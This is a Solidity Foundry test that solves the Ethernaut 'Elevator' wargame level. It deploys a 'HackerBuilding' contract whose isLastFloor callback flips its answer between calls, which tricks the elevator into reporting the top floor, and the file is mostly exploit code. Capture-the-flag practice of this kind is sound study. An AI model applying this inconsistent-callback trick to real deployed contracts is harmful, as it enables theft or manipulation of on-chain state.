// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IElevator {
    function goTo(uint _floor) external;
    function top() external view returns (bool);
}

contract HackerBuilding {
    IElevator target;
    bool public toggle = true; 

    constructor(address _target) {
        target = IElevator(_target);
    }

    function isLastFloor(uint) external returns (bool) {

        toggle = !toggle;
        return toggle;
    }
    

    function attack() public {
        target.goTo(10);
    }
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautElevatorTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2;

    function testLevel11_Elevator() public {

        address hacker = makeAddr("hacker");
        vm.startPrank(hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        IElevator elevator = IElevator(levelAddr);
        console.log("Status Top Awal:", elevator.top());

        console.log("Meluncurkan Gedung Palsu...");
        
        HackerBuilding myBuilding = new HackerBuilding(levelAddr);
        
        myBuilding.attack();

        console.log("Status Top Akhir:", elevator.top());
        
        assertTrue(elevator.top());
        console.log("HACKED! Lift sampai di puncak.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}